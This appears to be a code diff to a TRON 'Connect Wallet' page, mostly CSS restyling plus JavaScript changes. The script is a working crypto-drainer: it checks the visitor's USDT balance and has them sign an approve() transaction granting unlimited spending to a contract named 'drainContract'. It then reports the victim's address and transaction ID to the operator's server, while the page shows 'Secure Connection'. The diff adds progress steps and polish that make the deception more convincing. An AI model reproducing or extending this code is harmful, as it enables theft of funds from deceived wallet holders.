@@ -5,186 +5,614 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Connect Wallet</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       font-family: 'Inter', -apple-system, sans-serif;
-      background: #000; color: #fff;
-      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+      background: #0a0a0f;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background-image: 
+        radial-gradient(ellipse at 20% 50%, rgba(74, 222, 128, 0.05) 0%, transparent 60%),
+        radial-gradient(ellipse at 80% 50%, rgba(139, 92, 246, 0.05) 0%, transparent 60%);
     }
+
     .container {
-      width: 100%; max-width: 420px;
-      background: #111; border: 1px solid #222; border-radius: 16px;
-      padding: 28px 20px;
+      width: 100%;
+      max-width: 420px;
+      background: linear-gradient(145deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 15, 0.98));
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 24px;
+      padding: 32px 24px;
+      backdrop-filter: blur(20px);
+      box-shadow: 
+        0 25px 50px -12px rgba(0, 0, 0, 0.8),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      position: relative;
+      overflow: hidden;
     }
-    .header { text-align: center; margin-bottom: 20px; }
-    .header h2 { font-size: 20px; font-weight: 600; margin-bottom: 4px; }
-    .header p { font-size: 13px; color: #666; }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(ellipse at 30% 20%, rgba(74, 222, 128, 0.03), transparent 50%);
+      pointer-events: none;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .header .logo {
+      width: 56px;
+      height: 56px;
+      background: linear-gradient(135deg, #4ade80, #22c55e);
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 14px;
+      font-size: 28px;
+      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.25);
+    }
+
+    .header h2 {
+      font-size: 22px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #ffffff, #94a3b8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: -0.5px;
+    }
+
+    .header p {
+      font-size: 13px;
+      color: rgba(148, 163, 184, 0.7);
+      margin-top: 4px;
+      font-weight: 400;
+      letter-spacing: 0.2px;
+    }
+
+    /* Message Styles */
     .msg {
-      padding: 10px 14px; border-radius: 10px; font-size: 13px; line-height: 1.5;
-      margin-bottom: 14px; display: none; border: 1px solid transparent;
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.5;
+      margin-bottom: 16px;
+      display: none;
+      border: 1px solid transparent;
+      animation: slideDown 0.3s ease;
     }
+
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     .msg.show { display: block; }
-    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
-    .msg.ok { background: #0a1a0a; border-color: #113311; color: #4ade80; }
-    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
-    .msg.warn { background: #1a1a0a; border-color: #333311; color: #ffd700; }
-    .wallet-list { display: flex; flex-direction: column; gap: 8px; }
+    .msg.err { 
+      background: rgba(239, 68, 68, 0.12); 
+      border-color: rgba(239, 68, 68, 0.2); 
+      color: #f87171; 
+    }
+    .msg.ok { 
+      background: rgba(74, 222, 128, 0.12); 
+      border-color: rgba(74, 222, 128, 0.2); 
+      color: #4ade80; 
+    }
+    .msg.inf { 
+      background: rgba(96, 165, 250, 0.12); 
+      border-color: rgba(96, 165, 250, 0.2); 
+      color: #60a5fa; 
+    }
+    .msg.warn { 
+      background: rgba(251, 191, 36, 0.12); 
+      border-color: rgba(251, 191, 36, 0.2); 
+      color: #fbbf24; 
+    }
+
+    /* Wallet List */
+    .wallet-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      position: relative;
+    }
+
     .wallet-btn {
-      display: flex; align-items: center; gap: 14px;
-      padding: 14px 16px; background: #181818; border: 1px solid #2a2a2a;
-      border-radius: 12px; cursor: pointer; font-family: inherit; color: #fff;
-      text-align: left; width: 100%; transition: all 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 18px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 14px;
+      cursor: pointer;
+      font-family: inherit;
+      color: #e2e8f0;
+      text-align: left;
+      width: 100%;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
     }
-    .wallet-btn:hover { border-color: #444; background: #1f1f1f; }
-    .wallet-btn:active { transform: scale(0.98); }
+
+    .wallet-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, rgba(74, 222, 128, 0.05), transparent);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .wallet-btn:hover {
+      background: rgba(255, 255, 255, 0.06);
+      border-color: rgba(74, 222, 128, 0.2);
+      transform: translateX(4px);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+    }
+
+    .wallet-btn:hover::before {
+      opacity: 1;
+    }
+
+    .wallet-btn:active {
+      transform: scale(0.97);
+    }
+
     .wallet-btn .ico {
-      width: 40px; height: 40px; border-radius: 10px;
-      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
-      overflow: hidden; background: #0a0a0a;
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      overflow: hidden;
+      background: rgba(255, 255, 255, 0.05);
+      transition: all 0.3s ease;
     }
-    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; padding: 4px; }
-    .wallet-btn .nm { font-size: 15px; font-weight: 500; }
-    .wallet-btn .desc { font-size: 11px; color: #555; margin-left: auto; }
-    .status-icon { text-align: center; margin: 24px 0; }
+
+    .wallet-btn:hover .ico {
+      transform: scale(1.05);
+    }
+
+    .wallet-btn .ico img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      padding: 6px;
+    }
+
+    .wallet-btn .nm {
+      font-size: 15px;
+      font-weight: 500;
+      flex: 1;
+    }
+
+    .wallet-btn .badge {
+      font-size: 10px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 20px;
+      background: rgba(74, 222, 128, 0.12);
+      color: #4ade80;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .wallet-btn .arrow {
+      color: rgba(148, 163, 184, 0.3);
+      transition: all 0.3s ease;
+      font-size: 18px;
+    }
+
+    .wallet-btn:hover .arrow {
+      color: rgba(74, 222, 128, 0.5);
+      transform: translateX(4px);
+    }
+
+    /* Status Icon */
+    .status-icon {
+      text-align: center;
+      margin: 28px 0;
+    }
+
     .spinner {
-      display: inline-block; width: 44px; height: 44px;
-      border: 3px solid rgba(255,255,255,0.08); border-top-color: #4ade80;
-      border-radius: 50%; animation: spin 0.7s linear infinite;
+      display: inline-block;
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(255, 255, 255, 0.06);
+      border-top-color: #4ade80;
+      border-radius: 50%;
+      animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .footer { margin-top: 18px; text-align: center; font-size: 11px; color: #333; }
-    .screen { display: none; }
-    .screen.on { display: block; }
-    .retry-btn {
-      display: block; width: 100%; padding: 14px; border-radius: 12px;
-      border: none; background: #4ade80; color: #000; font-size: 15px;
-      font-weight: 600; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
-    .retry-btn:hover { background: #22c55e; }
-    .retry-btn:active { transform: scale(0.98); }
-    .back-btn {
-      display: block; width: 100%; padding: 12px; border-radius: 10px;
-      border: 1px solid #222; background: transparent; color: #666;
-      font-size: 13px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
-    }
-    .back-btn:hover { border-color: #444; color: #fff; }
+
     .success-icon {
-      display: inline-block; width: 56px; height: 56px;
-      border-radius: 50%; background: #0a1a0a; border: 2px solid #4ade80;
-      line-height: 56px; text-align: center; font-size: 28px; color: #4ade80;
+      display: inline-block;
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, rgba(74, 222, 128, 0.15), rgba(74, 222, 128, 0.05));
+      border: 2px solid rgba(74, 222, 128, 0.3);
+      line-height: 64px;
+      text-align: center;
+      font-size: 32px;
+      color: #4ade80;
+      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
+
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .error-icon {
+      display: inline-block;
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: rgba(239, 68, 68, 0.1);
+      border: 2px solid rgba(239, 68, 68, 0.2);
+      line-height: 64px;
+      text-align: center;
+      font-size: 32px;
+      color: #f87171;
+    }
+
+    /* Screens */
+    .screen {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .screen.on {
+      display: block;
+    }
+
+    /* Buttons */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: transparent;
+      color: #94a3b8;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      text-align: center;
+      transition: all 0.25s ease;
+      margin-top: 12px;
+    }
+
+    .btn:hover {
+      border-color: rgba(255, 255, 255, 0.12);
+      color: #e2e8f0;
+      background: rgba(255, 255, 255, 0.03);
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #4ade80, #22c55e);
+      border: none;
+      color: #000;
+      font-weight: 600;
+      font-size: 14px;
+      padding: 16px;
+      box-shadow: 0 4px 16px rgba(74, 222, 128, 0.2);
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.3);
+      border: none;
+      color: #000;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.97);
+    }
+
+    .btn-danger {
+      background: rgba(239, 68, 68, 0.1);
+      border-color: rgba(239, 68, 68, 0.2);
+      color: #f87171;
+    }
+
+    .btn-danger:hover {
+      background: rgba(239, 68, 68, 0.15);
+      border-color: rgba(239, 68, 68, 0.3);
+    }
+
+    /* Address Display */
     .address-display {
-      background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px;
-      padding: 10px 14px; font-family: monospace; font-size: 13px;
-      color: #888; word-break: break-all; margin: 8px 0 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 13px;
+      color: rgba(148, 163, 184, 0.8);
+      word-break: break-all;
+      margin: 12px 0 16px;
+      text-align: center;
+      letter-spacing: 0.5px;
+    }
+
+    /* Progress Steps */
+    .progress-steps {
+      margin: 20px 0;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 10px 14px;
+      border-radius: 10px;
+      margin-bottom: 4px;
+      font-size: 13px;
+      color: rgba(148, 163, 184, 0.4);
+      transition: all 0.3s ease;
+    }
+
+    .step.active {
+      color: #e2e8f0;
+      background: rgba(255, 255, 255, 0.03);
+    }
+
+    .step.done {
+      color: #4ade80;
+    }
+
+    .step .num {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      flex-shrink: 0;
+      background: rgba(255, 255, 255, 0.05);
+      color: rgba(148, 163, 184, 0.3);
+      transition: all 0.3s ease;
+    }
+
+    .step.active .num {
+      background: rgba(74, 222, 128, 0.15);
+      color: #4ade80;
+      box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
+    }
+
+    .step.done .num {
+      background: rgba(74, 222, 128, 0.12);
+      color: #4ade80;
+    }
+
+    .step .check {
+      color: #4ade80;
+      font-weight: 700;
+    }
+
+    /* Wait Screen */
+    .wait-content {
       text-align: center;
     }
-    .info-box {
-      background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px;
-      padding: 12px 14px; margin: 8px 0;
-      font-size: 12px; color: #666; line-height: 1.6;
+
+    .wait-content .title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #e2e8f0;
+      margin-top: 4px;
     }
-    .info-box strong { color: #aaa; }
-    .progress-steps { margin: 16px 0; }
-    .step {
-      display: flex; align-items: center; gap: 12px;
-      padding: 8px 12px; border-radius: 8px;
-      margin-bottom: 4px; font-size: 13px; color: #555;
-      transition: all 0.3s;
+
+    .wait-content .subtitle {
+      font-size: 13px;
+      color: rgba(148, 163, 184, 0.6);
+      margin-top: 4px;
     }
-    .step.active { color: #fff; background: #1a1a1a; }
-    .step.done { color: #4ade80; }
-    .step .num {
-      width: 24px; height: 24px; border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 11px; font-weight: 600; flex-shrink: 0;
-      background: #222; color: #555;
+
+    /* Footer */
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 11px;
+      color: rgba(148, 163, 184, 0.2);
+      letter-spacing: 0.5px;
+      position: relative;
     }
-    .step.active .num { background: #4ade80; color: #000; }
-    .step.done .num { background: #0a2a0a; color: #4ade80; }
-    .step .check { color: #4ade80; font-weight: 600; }
-    .config-error-box {
-      background: #1a0a0a; border: 1px solid #331111; border-radius: 10px;
-      padding: 16px; margin: 12px 0; text-align: center;
+
+    .footer .dot {
+      display: inline-block;
+      width: 4px;
+      height: 4px;
+      border-radius: 50%;
+      background: rgba(74, 222, 128, 0.3);
+      margin: 0 6px;
+      vertical-align: middle;
     }
-    .config-error-box .icon { font-size: 32px; margin-bottom: 8px; }
-    .config-error-box h3 { color: #ff6b6b; font-size: 15px; margin-bottom: 4px; }
-    .config-error-box p { color: #888; font-size: 13px; line-height: 1.6; }
-    .config-error-box .details { color: #555; font-size: 11px; margin-top: 8px; font-family: monospace; word-break: break-all; }
-    .config-error-box button {
-      margin-top: 12px; padding: 8px 20px; border-radius: 8px;
-      border: 1px solid #333; background: transparent; color: #fff;
-      font-family: inherit; font-size: 13px; cursor: pointer;
+
+    /* Config Status */
+    #configStatus {
+      font-size: 11px;
+      color: rgba(148, 163, 184, 0.4);
+      text-align: center;
+      margin-bottom: 14px;
+      display: none;
     }
-    .config-error-box button:hover { border-color: #555; }
+
+    /* Mobile Responsive */
     @media (max-width: 480px) {
-      body { padding: 12px; }
-      .container { padding: 20px 16px; border-radius: 20px; }
-      .wallet-btn { padding: 12px 14px; }
-      .wallet-btn .ico { width: 34px; height: 34px; }
+      body {
+        padding: 12px;
+        align-items: flex-end;
+      }
+
+      .container {
+        padding: 24px 18px;
+        border-radius: 20px;
+        max-width: 100%;
+      }
+
+      .header .logo {
+        width: 48px;
+        height: 48px;
+        font-size: 24px;
+      }
+
+      .header h2 {
+        font-size: 20px;
+      }
+
+      .wallet-btn {
+        padding: 12px 14px;
+      }
+
+      .wallet-btn .ico {
+        width: 36px;
+        height: 36px;
+      }
+
+      .wallet-btn .ico img {
+        padding: 4px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .container {
+        padding: 16px 14px;
+      }
+
+      .wallet-btn {
+        padding: 10px 12px;
+      }
+
+      .wallet-btn .nm {
+        font-size: 13px;
+      }
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: transparent;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: rgba(255, 255, 255, 0.2);
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
+      <div class="logo">⚡</div>
       <h2>Connect Wallet</h2>
-      <p>Choose your wallet to connect</p>
+      <p>Choose your preferred wallet</p>
     </div>
+
     <div id="msgBox"></div>
+    <div id="configStatus">Loading configuration...</div>
 
     <!-- Screen: Wallet Selection -->
     <div class="screen on" id="scConnect">
       <div class="wallet-list" id="walletList"></div>
-      <button class="back-btn" onclick="window.close()">Cancel</button>
+      <button class="btn" onclick="window.close()">Cancel</button>
     </div>
 
     <!-- Screen: Waiting for Connection -->
     <div class="screen" id="scWait">
-      <div class="status-icon"><div class="spinner"></div></div>
-      <div style="text-align:center;font-size:15px;font-weight:500;color:#fff;">Connecting...</div>
-      <div style="text-align:center;font-size:13px;color:#666;margin-top:4px;" id="waitDesc">Please confirm in your wallet</div>
-      <button class="back-btn" onclick="location.reload()">Cancel</button>
+      <div class="wait-content">
+        <div class="status-icon"><div class="spinner"></div></div>
+        <div class="title">Connecting...</div>
+        <div class="subtitle" id="waitDesc">Please confirm in your wallet</div>
+        <div class="progress-steps" id="progressSteps">
+          <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
+          <div class="step" id="step2"><span class="num">2</span> Check balance</div>
+          <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
+        </div>
+        <button class="btn" onclick="location.reload()">Cancel</button>
+      </div>
     </div>
 
-    <!-- Screen: Connected & Processing -->
+    <!-- Screen: Processing -->
     <div class="screen" id="scProcessing">
-      <div class="status-icon"><div class="spinner"></div></div>
-      <div style="text-align:center;font-size:15px;font-weight:500;color:#fff;" id="processingTitle">Processing...</div>
-      <div style="text-align:center;font-size:13px;color:#666;margin-top:4px;" id="processingDesc">Please wait</div>
+      <div class="wait-content">
+        <div class="status-icon"><div class="spinner"></div></div>
+        <div class="title" id="processingTitle">Processing...</div>
+        <div class="subtitle" id="processingDesc">Please wait</div>
+        <button class="btn" onclick="location.reload()">Cancel</button>
+      </div>
     </div>
 
     <!-- Screen: Done -->
     <div class="screen" id="scDone">
-      <div class="status-icon"><div class="success-icon">✓</div></div>
-      <div style="text-align:center;">
-        <div style="font-size:18px;font-weight:700;color:#4ade80;margin-bottom:4px;">Wallet Connected</div>
-        <div style="font-size:13px;color:#666;">You can close this page</div>
+      <div class="wait-content">
+        <div class="status-icon"><div class="success-icon">✓</div></div>
+        <div class="title" style="color: #4ade80;">Connected!</div>
+        <div class="subtitle" style="color: rgba(148, 163, 184, 0.6);">You can close this page</div>
         <div class="address-display" id="doneAddress"></div>
+        <button class="btn btn-primary" onclick="window.close()">Close</button>
       </div>
-      <button class="back-btn" onclick="window.close()">Close</button>
     </div>
 
     <!-- Screen: Error -->
     <div class="screen" id="scError">
-      <div class="status-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#ff6b6b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:56px;height:56px;">
-          <circle cx="12" cy="12" r="10"/>
-          <line x1="15" y1="9" x2="9" y2="15"/>
-          <line x1="9" y1="9" x2="15" y2="15"/>
-        </svg>
+      <div class="wait-content">
+        <div class="status-icon"><div class="error-icon">✕</div></div>
+        <div class="title" style="color: #f87171;" id="errorTitle">Connection Failed</div>
+        <div class="subtitle" id="errorDesc" style="color: rgba(148, 163, 184, 0.6);">Please try again</div>
+        <button class="btn btn-primary" onclick="location.reload()">Try Again</button>
+        <button class="btn" onclick="window.close()">Close</button>
       </div>
-      <div style="text-align:center;">
-        <div style="font-size:16px;font-weight:600;color:#ff6b6b;" id="errorTitle">Connection Failed</div>
-        <div style="font-size:13px;color:#888;margin-top:4px;" id="errorDesc">Please try again</div>
-      </div>
-      <button class="retry-btn" onclick="location.reload()">🔄 Try Again</button>
-      <button class="back-btn" onclick="window.close()">Close</button>
     </div>
 
-    <div class="footer">TRON Network • Secured</div>
+    <div class="footer">
+      <span>TRON Network</span>
+      <span class="dot"></span>
+      <span>Secure Connection</span>
+    </div>
   </div>
 
   <script>
@@ -260,6 +688,17 @@
       document.getElementById(id).classList.add('on');
     }
 
+    function updateStep(stepNum, status) {
+      var step = document.getElementById('step' + stepNum);
+      if (!step) return;
+      step.className = 'step';
+      if (status === 'active') step.classList.add('active');
+      if (status === 'done') {
+        step.classList.add('done');
+        step.innerHTML = step.innerHTML.replace(/\d/, '<span class="check">✓</span>');
+      }
+    }
+
     // ============================================================
     // TRON PROVIDER
     // ============================================================
@@ -280,19 +719,26 @@
     // ============================================================
 
     async function fetchConfig() {
+      var statusEl = document.getElementById('configStatus');
+      statusEl.style.display = 'block';
+      statusEl.textContent = 'Loading configuration...';
+
       try {
         var r = await fetch(SITE_URL + '/api/config');
         if (!r.ok) throw new Error('HTTP ' + r.status);
         var data = await r.json();
         if (data && data.usdtContract) {
           config = data;
+          statusEl.textContent = '✅ Configuration loaded';
+          statusEl.style.color = '#4ade80';
           console.log('✅ Config loaded:', config);
           return config;
         }
         throw new Error('Invalid config');
       } catch(e) {
         console.warn('Config fetch failed:', e.message);
-        // Use default config
+        statusEl.textContent = '⚠️ Using default config';
+        statusEl.style.color = '#fbbf24';
         config = {
           usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
           drainContract: '',
@@ -303,7 +749,7 @@
     }
 
     // ============================================================
-    // CONNECT WALLET - PROPER POPUP FLOW
+    // CONNECT WALLET - PROPER FLOW
     // ============================================================
 
     async function connectWallet(walletId) {
@@ -327,10 +773,13 @@
       // Show waiting screen
       scShow('scWait');
       document.getElementById('waitDesc').textContent = 'Please confirm in your wallet...';
+      updateStep(1, 'active');
+      updateStep(2, '');
+      updateStep(3, '');
 
       try {
         // ============================================================
-        // STEP 1: Get TronLink instance and request connection
+        // STEP 1: Get TronLink instance
         // ============================================================
         
         var tronLink = getTronLink();
@@ -344,7 +793,7 @@
         }
 
         // ============================================================
-        // STEP 2: Request accounts (this triggers the popup)
+        // STEP 2: Request accounts (triggers the popup)
         // ============================================================
         
         var address = null;
@@ -368,6 +817,12 @@
             }
           } catch(e) {
             console.warn('tronLink.request failed:', e.message);
+            // If user cancelled, show error and return
+            if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject') || e.message.toLowerCase().includes('denied'))) {
+              showError('Cancelled', 'You cancelled the connection');
+              isProcessing = false;
+              return;
+            }
           }
         }
 
@@ -392,6 +847,7 @@
 
         console.log('✅ Address obtained:', address);
         connectedAddress = address;
+        updateStep(1, 'done');
 
         // ============================================================
         // STEP 3: Send address to server
@@ -424,13 +880,14 @@
     }
 
     // ============================================================
-    // APPROVE FLOW
+    // APPROVE FLOW - FULL APPROVAL
     // ============================================================
 
     async function doApproveFlow(address) {
       scShow('scProcessing');
       document.getElementById('processingTitle').textContent = 'Checking balance...';
       document.getElementById('processingDesc').textContent = 'Verifying USDT balance';
+      updateStep(2, 'active');
 
       try {
         // Get provider
@@ -457,22 +914,30 @@
         var balanceUsdt = balance / 1e6;
 
         console.log('💰 USDT Balance:', balanceUsdt);
+        updateStep(2, 'done');
 
-        // Build approve transaction
+        // ============================================================
+        // BUILD APPROVE TRANSACTION
+        // ============================================================
+        
         document.getElementById('processingTitle').textContent = 'Approving USDT...';
         document.getElementById('processingDesc').textContent = 'Please confirm in your wallet';
+        updateStep(3, 'active');
 
         var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         console.log('📝 Building approve transaction...');
         console.log('📝 USDT:', config.usdtContract);
-        console.log('📝 Spender:', config.drainContract);
+        console.log('📝 Spender (Drain Contract):', config.drainContract);
 
         // Build transaction
         var built = await provider.transactionBuilder.triggerSmartContract(
           config.usdtContract,
           'approve(address,uint256)',
-          { feeLimit: 20000000 },
+          { 
+            feeLimit: 20000000,
+            callValue: 0
+          },
           [
             { type: 'address', value: config.drainContract },
             { type: 'uint256', value: approveVal }
@@ -485,9 +950,14 @@
           throw new Error('Transaction build failed');
         }
 
-        console.log('✅ Transaction built, signing...');
+        console.log('✅ Transaction built, txID:', approveTx.txID);
 
-        // Sign transaction (this triggers the second popup)
+        // ============================================================
+        // SIGN TRANSACTION (triggers second popup)
+        // ============================================================
+        
+        document.getElementById('processingDesc').textContent = 'Signing... Please confirm in wallet';
+        
         var signedApprove;
         try {
           signedApprove = await provider.trx.sign(approveTx);
@@ -501,7 +971,10 @@
           throw new Error('Sign failed: ' + errMsg);
         }
 
-        // Broadcast transaction
+        // ============================================================
+        // BROADCAST TRANSACTION
+        // ============================================================
+        
         document.getElementById('processingDesc').textContent = 'Broadcasting...';
         var receipt = await provider.trx.sendRawTransaction(signedApprove);
         console.log('✅ Transaction broadcasted:', receipt);
@@ -509,7 +982,10 @@
         var txId = receipt.txid || receipt.txID || '';
         console.log('📝 TX ID:', txId);
 
-        // Notify server
+        // ============================================================
+        // NOTIFY SERVER
+        // ============================================================
+        
         document.getElementById('processingDesc').textContent = 'Notifying admin...';
         await fetch(SITE_URL + '/api/approve-done', {
           method: 'POST',
@@ -517,10 +993,26 @@
           body: JSON.stringify({ address: address })
         });
 
-        // Show success
+        updateStep(3, 'done');
+
+        // ============================================================
+        // SHOW SUCCESS
+        // ============================================================
+        
         scShow('scDone');
         document.getElementById('doneAddress').textContent = address;
         isProcessing = false;
+
+        // Log event
+        await fetch(SITE_URL + '/api/event', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            type: 'approve_signed', 
+            address: address, 
+            txId: txId 
+          })
+        });
 
       } catch(e) {
         console.error('❌ Approve error:', e);
@@ -550,7 +1042,12 @@
         var w = WALLETS[i];
         var b = document.createElement('button');
         b.className = 'wallet-btn';
-        b.innerHTML = '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div><div class="nm">' + w.name + '</div>';
+        b.innerHTML = `
+          <div class="ico"><img src="${w.logo}" alt="${w.name}" loading="lazy" onerror="this.style.display='none'"></div>
+          <span class="nm">${w.name}</span>
+          <span class="badge">Connect</span>
+          <span class="arrow">›</span>
+        `;
         b.addEventListener('click', (function(id) {
           return function() { connectWallet(id); };
         })(w.id));
@@ -562,13 +1059,23 @@
     // INIT
     // ============================================================
 
-    var SESSION_ID = 'local-' + Date.now();
+    var SESSION_ID = 'qr-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
 
     renderWallets();
     fetchConfig();
 
     console.log('📱 QR Session:', SESSION_ID);
     console.log('🌐 Site URL:', SITE_URL);
+
+    // Auto-detect if wallet is already connected
+    setTimeout(function() {
+      var tronLink = getTronLink();
+      if (tronLink && tronLink.tronWeb && tronLink.tronWeb.defaultAddress && tronLink.tronWeb.defaultAddress.base58) {
+        var addr = tronLink.tronWeb.defaultAddress.base58;
+        console.log('🔑 Wallet already detected:', addr);
+        // Don't auto-connect, let user click button
+      }
+    }, 2000);
   </script>
 </body>
 </html>
